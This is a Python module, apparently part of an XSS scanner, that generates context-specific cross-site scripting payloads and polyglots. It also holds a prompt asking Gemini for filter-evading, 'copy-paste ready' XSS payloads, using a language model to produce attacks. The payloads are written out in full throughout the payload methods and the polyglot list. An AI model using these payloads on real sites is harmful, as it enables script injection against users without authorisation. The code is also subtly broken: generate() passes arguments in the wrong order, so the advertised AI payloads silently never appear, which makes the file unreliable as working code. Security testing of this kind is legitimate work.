"""
Context-aware payload generation engine with Gemini AI integration.
Generates targeted payloads based on detected injection contexts and AI analysis.
"""

import random
import os
from typing import List, Optional
from .analyzer import InjectionContext

# Gemini AI integration (optional)
try:
    import google.generativeai as genai
    GEMINI_AVAILABLE = True
except ImportError:
    GEMINI_AVAILABLE = False


class PayloadGenerator:
    """
    Generates smart, context-aware XSS payloads.
    Each context gets specialized payloads designed to bypass that specific filter.
    Optionally uses Gemini AI for advanced payload generation.
    """
    
    # JavaScript functions to trigger (rotated for variety)
    JS_TRIGGERS = [
        "alert(1)",
        "alert(document.domain)",
        "alert`1`",
        "confirm(1)",
        "prompt(1)",
        "print()",
    ]
    
    gemini_model = None
    gemini_enabled = False
    
    @classmethod
    def initialize_gemini(cls, api_key: Optional[str] = None):
        """
        Initialize Gemini AI (gemini-2.0-flash-exp) for advanced payload generation.
        
        Args:
            api_key: Gemini API key (or reads from GEMINI_API_KEY env var)
        """
        if not GEMINI_AVAILABLE:
            return False
        
        try:
            key = api_key or os.getenv('GEMINI_API_KEY')
            if not key:
                return False
            
            genai.configure(api_key=key)
            
            # Use gemini-2.0-flash-exp (free tier model)
            cls.gemini_model = genai.GenerativeModel(
                'gemini-2.0-flash-exp',
                generation_config={
                    'temperature': 0.9,
                    'top_p': 0.95,
                    'top_k': 40,
                    'max_output_tokens': 1024,
                }
            )
            cls.gemini_enabled = True
            return True
        except Exception as e:
            cls.gemini_enabled = False
            return False
    
    @classmethod
    def get_trigger(cls) -> str:
        """Get a random JavaScript trigger function."""
        return random.choice(cls.JS_TRIGGERS)
    
    @classmethod
    def generate_ai_payloads(cls, param_name: str, context: InjectionContext, html_snippet: str = "", response_snippet: str = "") -> List[str]:
        """
        Use Gemini AI to analyze the parameter and generate advanced XSS payloads.
        
        Args:
            param_name: The parameter name being tested
            context: The detected injection context
            html_snippet: HTML snippet showing the injection point
            response_snippet: Broader response context for analysis
            
        Returns:
            List of AI-generated, context-aware XSS payloads
        """
        if not cls.gemini_enabled or not cls.gemini_model:
            return []
        
        try:
            # Comprehensive prompt for Gemini to analyze and generate payloads
            prompt = f"""You are an expert XSS (Cross-Site Scripting) security researcher and penetration tester. Your task is to analyze a web application parameter and generate highly effective XSS payloads.

**TARGET ANALYSIS:**
- Parameter Name: `{param_name}`
- Injection Context: {context.value}
- HTML Injection Point:
```html
{html_snippet[:300] if html_snippet else "Not available"}
```

**YOUR TASK:**
Analyze the injection context and generate 5 creative, working XSS payloads specifically designed for this scenario.

**REQUIREMENTS:**
1. **Context-Specific**: Each payload MUST be tailored to the injection context ({context.value})
2. **Browser Compatible**: Work in modern browsers (Chrome, Firefox, Safari, Edge)
3. **Filter Evasion**: Use creative techniques to bypass common WAF/XSS filters:
   - HTML encoding variations
   - JavaScript obfuscation
   - Case manipulation
   - Alternative event handlers
   - Unicode/hex encoding
   - Protocol handlers (javascript:, data:)
   - DOM-based vectors
4. **Trigger Functions**: Use alert(1), alert(document.domain), confirm(1), or prompt(1)
5. **Practical**: Each payload should be copy-paste ready and actually work

**CONTEXT-SPECIFIC GUIDANCE:**

For "HTML Text Node":
- Break out of text context into executable JavaScript
- Use <script>, <img>, <svg>, <iframe>, event handlers
- Example: <svg onload=alert(1)>

For "Attribute Value (Double Quote)":
- Break out of double quotes first: "
- Close the tag or inject event handler
- Example: "><script>alert(1)</script>

For "Attribute Value (Single Quote)":
- Break out of single quotes first: '
- Example: '><img src=x onerror=alert(1)>

For "Inside <script> Tag":
- Break out of JavaScript context
- Example: </script><script>alert(1)</script>
- Or: ';alert(1)//

For "JavaScript String":
- Escape the string context
- Example: '-alert(1)-'

For "JSON Context":
- Break JSON structure
- Example: \"}}<script>alert(1)</script>

For "HTML Comment":
- Close comment and inject
- Example: --><script>alert(1)</script><!--

**OUTPUT FORMAT:**
Provide ONLY the 5 payloads, one per line, NO explanations, NO markdown, NO numbering:

payload1
payload2
payload3
payload4
payload5

**GENERATE PAYLOADS NOW:**"""

            # Generate payloads using Gemini
            response = cls.gemini_model.generate_content(prompt)
            
            if not response or not response.text:
                return []
            
            # Parse response - extract payloads
            raw_text = response.text.strip()
            
            # Remove markdown code blocks if present
            if '```' in raw_text:
                # Extract content between code blocks
                parts = raw_text.split('```')
                if len(parts) >= 2:
                    raw_text = parts[1]
                    if raw_text.startswith('html') or raw_text.startswith('javascript'):
                        raw_text = '\n'.join(raw_text.split('\n')[1:])
            
            # Split into lines and clean
            payloads = []
            for line in raw_text.split('\n'):
                line = line.strip()
                
                # Skip empty lines, explanations, numbering
                if not line or len(line) < 5:
                    continue
                if line.startswith(('#', '//', '/*', '-', '*', '1.', '2.', '3.', '4.', '5.')):
                    continue
                if any(word in line.lower() for word in ['explanation', 'note:', 'example:', 'payload:']):
                    continue
                
                # Clean up any remaining markdown or formatting
                line = line.strip('`').strip('"').strip("'")
                
                payloads.append(line)
            
            # Return up to 5 unique payloads
            unique_payloads = list(dict.fromkeys(payloads))[:5]
            
            return unique_payloads
            
        except Exception as e:
            # Silently fail and return empty list
            return []
    
    @classmethod
    def generate(cls, context: InjectionContext, html_snippet: str = "") -> List[str]:
        """
        Generate payloads for a specific injection context.
        Combines traditional payloads with AI-generated ones if available.
        
        Args:
            context: The detected InjectionContext
            html_snippet: Optional HTML snippet for AI analysis
            
        Returns:
            List of context-appropriate XSS payloads
        """
        trigger = cls.get_trigger()
        
        payload_map = {
            InjectionContext.HTML_TEXT: cls._html_text_payloads,
            InjectionContext.ATTR_VALUE_DOUBLE_QUOTE: cls._double_quote_payloads,
            InjectionContext.ATTR_VALUE_SINGLE_QUOTE: cls._single_quote_payloads,
            InjectionContext.ATTR_VALUE_NO_QUOTE: cls._unquoted_attr_payloads,
            InjectionContext.ATTR_NAME: cls._attr_name_payloads,
            InjectionContext.SCRIPT_BLOCK: cls._script_block_payloads,
            InjectionContext.SCRIPT_STRING: cls._script_string_payloads,
            InjectionContext.STYLE_BLOCK: cls._style_block_payloads,
            InjectionContext.HTML_COMMENT: cls._html_comment_payloads,
            InjectionContext.JSON_VALUE: cls._json_payloads,
            InjectionContext.URL_PARAM: cls._url_param_payloads,
        }
        
        generator = payload_map.get(context)
        traditional_payloads = generator(trigger) if generator else [f"<script>{trigger}</script>"]
        
        # Add AI-generated payloads if enabled
        ai_payloads = cls.generate_ai_payloads(context, html_snippet)
        
        # Combine traditional and AI payloads
        return traditional_payloads + ai_payloads
    
    @staticmethod
    def _html_text_payloads(trigger: str) -> List[str]:
        """Payloads for HTML text node context."""
        return [
            f"<script>{trigger}</script>",
            f"<img src=x onerror={trigger}>",
            f"<svg onload={trigger}>",
            f"<iframe src=javascript:{trigger}>",
            f"<body onload={trigger}>",
            f"<details open ontoggle={trigger}>",
            f"<marquee onstart={trigger}>",
        ]
    
    @staticmethod
    def _double_quote_payloads(trigger: str) -> List[str]:
        """Payloads for double-quoted attribute values."""
        return [
            f'"><script>{trigger}</script>',
            f'" onload="{trigger}" x="',
            f'" autofocus onfocus="{trigger}" x="',
            f'" onclick="{trigger}" x="',
            f'"><img src=x onerror={trigger}>',
            f'"><svg onload={trigger}>',
            f'" onerror="{trigger}" src="x',
        ]
    
    @staticmethod
    def _single_quote_payloads(trigger: str) -> List[str]:
        """Payloads for single-quoted attribute values."""
        return [
            f"'><script>{trigger}</script>",
            f"' onload='{trigger}' x='",
            f"' autofocus onfocus='{trigger}' x='",
            f"' onclick='{trigger}' x='",
            f"'><img src=x onerror={trigger}>",
            f"'><svg onload={trigger}>",
        ]
    
    @staticmethod
    def _unquoted_attr_payloads(trigger: str) -> List[str]:
        """Payloads for unquoted attribute values."""
        return [
            f" onload={trigger} x=",
            f" onclick={trigger} x=",
            f" onfocus={trigger} autofocus x=",
            f"><script>{trigger}</script>",
            f"><img src=x onerror={trigger}>",
        ]
    
    @staticmethod
    def _attr_name_payloads(trigger: str) -> List[str]:
        """Payloads when injecting into attribute name."""
        return [
            f" onload={trigger} ",
            f" onclick={trigger} ",
            f" onfocus={trigger} autofocus ",
            f"><script>{trigger}</script><x ",
        ]
    
    @staticmethod
    def _script_block_payloads(trigger: str) -> List[str]:
        """Payloads for inside <script> tags."""
        return [
            f";{trigger}//",
            f";{trigger}/*",
            f"</script><script>{trigger}</script><script>",
            f"';{trigger}//",
            f'";{trigger}//',
            f"-{trigger}//",
        ]
    
    @staticmethod
    def _script_string_payloads(trigger: str) -> List[str]:
        """Payloads for JavaScript string context."""
        return [
            f"';{trigger}//",
            f'";{trigger}//',
            f"'-{trigger}-'",
            f'"-{trigger}-"',
            f"</script><script>{trigger}</script><script>",
        ]
    
    @staticmethod
    def _style_block_payloads(trigger: str) -> List[str]:
        """Payloads for CSS/style context."""
        return [
            f"</style><script>{trigger}</script><style>",
            f"</style><img src=x onerror={trigger}><style>",
            f"}} </style><script>{trigger}</script><style>",
        ]
    
    @staticmethod
    def _html_comment_payloads(trigger: str) -> List[str]:
        """Payloads for HTML comment context."""
        return [
            f"--><script>{trigger}</script><!--",
            f"--><img src=x onerror={trigger}><!--",
            f"--><svg onload={trigger}><!--",
        ]
    
    @staticmethod
    def _json_payloads(trigger: str) -> List[str]:
        """Payloads for JSON context."""
        return [
            f'\\"><script>{trigger}</script>',
            f'\\"}}}}<script>{trigger}</script>',
            f'\\u003cscript\\u003e{trigger}\\u003c/script\\u003e',
        ]
    
    @staticmethod
    def _url_param_payloads(trigger: str) -> List[str]:
        """Payloads for URL parameter context."""
        return [
            f"javascript:{trigger}",
            f"data:text/html,<script>{trigger}</script>",
            f"javascript:void({trigger})",
            f'" onload={trigger} x="',
            f"' onload={trigger} x='",
        ]


class PolyglotPayloads:
    """
    Advanced polyglot payloads that work across multiple contexts.
    These are tested last as they're more likely to be detected.
    """
    
    POLYGLOTS = [
        'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//',
        '"><img src=x onerror=alert(1)>',
        "'><script>alert(1)</script>",
        'javascript:alert(1)',
        '<svg/onload=alert(1)>',
        '<iframe src=javascript:alert(1)>',
    ]
    
    @classmethod
    def get_all(cls) -> List[str]:
        """Return all polyglot payloads."""
        return cls.POLYGLOTS.copy()
